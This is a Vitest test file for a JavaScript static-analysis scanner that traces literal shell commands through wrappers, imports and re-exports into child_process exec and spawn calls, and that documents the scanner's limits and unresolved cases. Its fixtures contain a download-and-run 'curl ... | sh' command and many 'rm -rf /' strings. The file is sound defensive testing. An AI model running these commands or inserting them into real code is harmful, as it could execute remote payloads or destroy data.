import { afterEach, beforeEach, expect, it } from 'vitest';
import { createRequire } from 'node:module';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const require = createRequire(import.meta.url);
const { scanStaticDirectory } = require('../../src/main/static-analysis');
let root;

beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-static-js-flow-'));
});
afterEach(() => {
  expect(path.dirname(path.resolve(root))).toBe(path.resolve(os.tmpdir()));
  fs.rmSync(root, { recursive: true, force: true });
});

async function scan(sources) {
  for (const [name, source] of Object.entries(sources)) {
    fs.mkdirSync(path.dirname(path.join(root, name)), { recursive: true });
    fs.writeFileSync(path.join(root, name), source);
  }
  return scanStaticDirectory('package', root);
}

it('tracks a literal argument through a local process wrapper to the entry call', async () => {
  const report = await scan({
    'main.cjs': [
      'const { exec } = require("node:child_process");',
      'function launch(command) { exec(command); }',
      'launch("curl https://PRIVATE.invalid/install | sh");',
    ].join('\n'),
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA001',
      path: 'main.cjs',
      line: 3,
      context: 'javascript-command-flow',
    }),
  );
  expect(report.safety).toBe('not-determined');
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it('attaches the original hashes of every re-export and literal dependency', async () => {
  const sources = {
    'main.mjs':
      'import { launch } from "./relay.mjs";\nimport command from "./command.mjs";\nlaunch(command);',
    'relay.mjs': 'export { launch } from "./worker.mjs";',
    'worker.mjs':
      'import { exec } from "node:child_process";\nexport function launch(command) { return exec(command); }',
    'command.mjs': 'export default "curl https://PRIVATE.invalid/install | sh";',
  };
  const report = await scan(sources);
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA001',
      path: 'main.mjs',
      line: 3,
      context: 'javascript-command-flow',
      flow: {
        sink: {
          path: 'worker.mjs',
          line: 2,
          sha256: createHash('sha256').update(sources['worker.mjs']).digest('hex'),
        },
        files: Object.entries(sources)
          .sort(([left], [right]) => left.localeCompare(right))
          .map(([name, source]) => ({
            path: name,
            sha256: createHash('sha256').update(source).digest('hex'),
          })),
      },
    }),
  );
  expect(report.issues).toContainEqual({
    path: 'main.mjs',
    reason: 'javascript-cross-file-effects-not-evaluated',
  });
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it.each([
  [
    'named constant',
    'import { command } from "./helper.mjs";\nexec(command);',
    'export const command = "rm -rf /";',
  ],
  [
    'namespace constant',
    'import * as helper from "./helper.mjs";\nexec(helper.command);',
    'const command = "rm -rf /"; export { command };',
  ],
  [
    'namespace wrapper',
    'import * as helper from "./helper.mjs";\nhelper.launch("rm -rf /");',
    'import { exec } from "node:child_process"; export const launch = command => exec(command);',
  ],
  [
    'default wrapper',
    'import launch from "./helper.mjs";\nlaunch("rm -rf /");',
    'import { exec } from "node:child_process"; export default function (command) { exec(command); }',
  ],
  [
    'renamed wrapper',
    'import { launch as invoke } from "./helper.mjs";\ninvoke("rm -rf /");',
    'import { exec } from "node:child_process"; function launch(command) { exec(command); } export { launch };',
  ],
])('links the %s snapshot shape', async (_name, main, helper) => {
  const report = await scan({
    'main.mjs': 'import { exec } from "node:child_process";\n' + main,
    'helper.mjs': helper,
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA003',
      path: 'main.mjs',
      line: 3,
      context: 'javascript-command-flow',
    }),
  );
});

it('links a relative CommonJS destructuring require to an explicit ESM snapshot', async () => {
  const report = await scan({
    'main.cjs': 'const { launch } = require("./helper.mjs");\nlaunch("rm -rf /");',
    'helper.mjs':
      'import { exec } from "node:child_process"; export function launch(command) { exec(command); }',
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA003',
      path: 'main.cjs',
      line: 2,
      context: 'javascript-command-flow',
    }),
  );
});

it('retains primitive parameters through a local wrapper chain and immutable declarations', async () => {
  const report = await scan({
    'main.cjs': [
      'const { exec } = require("node:child_process");',
      'function inner(command) { const suffix = " /"; return exec(command + suffix); }',
      'const outer = command => inner(command);',
      'outer("rm -rf");',
    ].join('\n'),
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({ ruleId: 'STA003', line: 4, context: 'javascript-command-flow' }),
  );
});

it('preserves an argv argument as data through a wrapper', async () => {
  const report = await scan({
    'main.cjs':
      'const { spawn } = require("node:child_process");\nfunction launch(command) { spawn("echo", [command]); }\nlaunch("rm -rf /");',
  });
  expect(report.findings).toEqual([]);
  expect(report.safety).toBe('not-determined');
});

it.each([
  ['default parameter', 'function launch(command = "") { exec(command); }', 'launch("rm -rf /");'],
  ['rest parameter', 'function launch(...command) { exec(command[0]); }', 'launch("rm -rf /");'],
  [
    'destructured parameter',
    'function launch({command}) { exec(command); }',
    'launch({command: "rm -rf /"});',
  ],
  ['async wrapper', 'async function launch(command) { exec(command); }', 'launch("rm -rf /");'],
  ['generator', 'function* launch(command) { exec(command); }', 'launch("rm -rf /");'],
  [
    'conditional body',
    'function launch(command) { if (process.env.FLAG) exec(command); }',
    'launch("rm -rf /");',
  ],
  ['early return', 'function launch(command) { return; exec(command); }', 'launch("rm -rf /");'],
  ['extra argument', 'function launch(command) { exec(command); }', 'launch("rm -rf /", "extra");'],
  ['mutable argument', 'function launch(command) { exec(command[0]); }', 'launch(["rm -rf /"]);'],
  ['spread call', 'function launch(command) { exec(command); }', 'launch(...["rm -rf /"]);'],
  [
    'unknown local initializer',
    'function launch(command) { const ignored = customize(); exec(command); }',
    'launch("rm -rf /");',
  ],
  [
    'mutated parameter',
    'function launch(command) { command = "echo safe"; exec(command); }',
    'launch("rm -rf /");',
  ],
  ['dynamic input', 'function launch(command) { exec(command); }', 'launch(process.env.PRIVATE);'],
])('leaves %s unresolved', async (_name, declaration, call) => {
  const report = await scan({
    'main.cjs': 'const { exec } = require("node:child_process");\n' + declaration + '\n' + call,
  });
  expect(report.findings).toEqual([]);
  expect(report.complete).toBe(false);
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it.each([
  [
    'mutation',
    'import { exec } from "node:child_process"; export let command = "rm -rf /"; command = "echo safe";',
  ],
  ['mutable export', 'export const command = ["rm -rf /"];'],
  ['CommonJS export assignment', 'exports.command = "rm -rf /";'],
  ['star export', 'export * from "./value.mjs";'],
  ['dynamic export', 'export const command = process.env.PRIVATE;'],
])('does not infer a command from %s', async (_name, helper) => {
  const report = await scan({
    'main.mjs':
      'import { exec } from "node:child_process"; import { command } from "./helper.mjs"; exec(command);',
    'helper.mjs': helper,
    'value.mjs': 'export const command = "rm -rf /";',
  });
  expect(report.findings).toEqual([]);
  expect(report.complete).toBe(false);
});

it('bounds recursive imports and recursive wrappers with fixed coverage gaps', async () => {
  const report = await scan({
    'main.mjs': 'import { launch } from "./one.mjs"; launch("rm -rf /");',
    'one.mjs': 'export { launch } from "./two.mjs";',
    'two.mjs': 'export { launch } from "./one.mjs";',
    'local.cjs': 'function launch(command) { return launch(command); } launch("rm -rf /");',
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'main.mjs', reason: 'javascript-flow-cycle' });
  expect(report.issues).toContainEqual({ path: 'local.cjs', reason: 'javascript-flow-cycle' });
});

it('invalidates an exported function after its outer declaration is reassigned', async () => {
  const report = await scan({
    'main.mjs': 'import { launch } from "./helper.mjs"; launch("rm -rf /");',
    'helper.mjs':
      'import { exec } from "node:child_process"; export function launch(command) { exec(command); } launch = () => {};',
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'main.mjs',
    reason: 'javascript-mutation-not-resolved',
  });
});

it('distinguishes an exported function declaration from a parameter with the same name', async () => {
  const report = await scan({
    'main.mjs': 'import { launch } from "./helper.mjs"; launch("rm -rf /");',
    'helper.mjs':
      'import { exec } from "node:child_process"; export function launch(launch) { exec(launch); }',
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA003',
      path: 'main.mjs',
      context: 'javascript-command-flow',
    }),
  );
});

it('caps a chain of local wrappers before reaching an unbounded depth', async () => {
  const definitions = Array.from(
    { length: 10 },
    (_, index) =>
      `function f${index}(command) { ${index === 9 ? 'exec' : 'f' + (index + 1)}(command); }`,
  );
  const report = await scan({
    'main.cjs': [
      'const { exec } = require("node:child_process");',
      ...definitions,
      'f0("rm -rf /");',
    ].join('\n'),
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'main.cjs', reason: 'javascript-flow-depth-limit' });
});

it('caps repeated unresolved wrapper expansions', async () => {
  const report = await scan({
    'main.cjs':
      'function launch(command) { opaque(command); }\n' + 'launch("literal");\n'.repeat(257),
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'main.cjs', reason: 'javascript-flow-call-limit' });
});

it('caps per-entry imported module preparation', async () => {
  const sources = {};
  const imports = [];
  for (let index = 0; index < 33; index++) {
    sources[`helper${index}.mjs`] =
      'import { exec } from "node:child_process"; export function launch(command) { exec(command); }';
    imports.push(`import { launch as c${index} } from "./helper${index}.mjs";`);
  }
  sources['main.mjs'] = [
    'import { exec } from "node:child_process";',
    ...imports,
    'c32("rm -rf /");',
  ].join('\n');
  const report = await scan(sources);
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'main.mjs',
    reason: 'javascript-flow-module-limit',
  });
});

it.each([
  ['mixed array', 'mutate([helper, opaque]);'],
  ['conditional alias', 'const hidden = flag ? helper : other; mutate(hidden);'],
  ['logical alias', 'const hidden = helper || other; mutate(hidden);'],
  ['conditional argument', 'mutate(flag ? helper : other);'],
  ['logical argument', 'mutate(helper || other);'],
  ['nested mixed array', 'mutate({ entries: [helper, opaque] });'],
  ['returned namespace', 'function acquire() { return helper; } mutate(acquire());'],
  ['arrow return', 'const acquire = () => helper; mutate(acquire());'],
  ['attribute store', 'opaque.helper = helper;'],
  ['mutable alias', 'let alias = helper; mutate(alias);'],
])('invalidates a namespace escaping through %s', async (_name, escape) => {
  const report = await scan({
    'main.mjs':
      'import * as helper from "./helper.mjs";\n' + escape + '\nhelper.launch("rm -rf /");',
    'helper.mjs':
      'import { exec } from "node:child_process"; export function launch(command) { exec(command); }',
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'main.mjs',
    reason: 'javascript-module-escape-not-resolved',
  });
});

it('keeps a process-call receiver distinct from its returned value and object keys', async () => {
  const report = await scan({
    'main.cjs':
      'const cp = require("node:child_process"); const example = { cp: "literal" }; function launch(command) { return cp.exec(command); } launch("rm -rf /");',
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({ ruleId: 'STA003', context: 'javascript-command-flow' }),
  );
  expect(report.issues).not.toContainEqual({
    path: 'main.cjs',
    reason: 'javascript-module-escape-not-resolved',
  });
});

it('preserves an immutable module alias used only as a process-call receiver', async () => {
  const report = await scan({
    'main.mjs': 'import cp from "node:child_process"; const alias = cp; alias.exec("rm -rf /");',
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({ ruleId: 'STA003', context: 'javascript-command' }),
  );
  expect(report.issues).not.toContainEqual({
    path: 'main.mjs',
    reason: 'javascript-module-escape-not-resolved',
  });
});

it('invalidates module assumptions when an escaping alias chain exceeds its inspection bound', async () => {
  const aliases = Array.from(
    { length: 70 },
    (_, index) => `const a${index} = ${index ? 'a' + (index - 1) : 'flag ? cp : other'};`,
  );
  const report = await scan({
    'main.mjs': [
      'import cp from "node:child_process";',
      ...aliases,
      'mutate(a69); cp.exec("rm -rf /");',
    ].join('\n'),
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'main.mjs', reason: 'javascript-value-limit' });
});

it('invalidates a builtin module inside an array with unresolved siblings', async () => {
  const report = await scan({
    'main.mjs': 'import cp from "node:child_process"; mutate([cp, opaque]); cp.exec("rm -rf /");',
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'main.mjs',
    reason: 'javascript-module-escape-not-resolved',
  });
});

it('invalidates an escaped or overwritten snapshot namespace', async () => {
  const report = await scan({
    'main.mjs':
      'import * as helper from "./helper.mjs"; helper.launch = () => {}; helper.launch("rm -rf /");',
    'helper.mjs':
      'import { exec } from "node:child_process"; export function launch(command) { exec(command); }',
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'main.mjs',
    reason: 'javascript-mutation-not-resolved',
  });
});

it.each([
  ['default argv', 'import value from "./value.mjs";', '["-rf", "/"]', 'spawn("rm", value);'],
  [
    'default options',
    'import value from "./value.mjs";',
    '{ shell: true }',
    'spawn("curl", ["https://example.invalid", "|", "sh"], value);',
  ],
  [
    're-exported argv',
    'import { value } from "./relay.mjs";',
    '["-rf", "/"]',
    'spawn("rm", value);',
  ],
])(
  'keeps mutable %s unresolved after import and escape',
  async (_name, imported, exported, call) => {
    const report = await scan({
      'main.mjs':
        'import { spawn } from "node:child_process";\n' + imported + '\nmutate(value);\n' + call,
      'relay.mjs': 'export { default as value } from "./value.mjs";',
      'value.mjs': 'export default ' + exported + ';',
    });
    expect(report.findings).toEqual([]);
    expect(report.issues).toContainEqual({
      path: 'main.mjs',
      reason: 'javascript-mutable-binding-not-resolved',
    });
  },
);
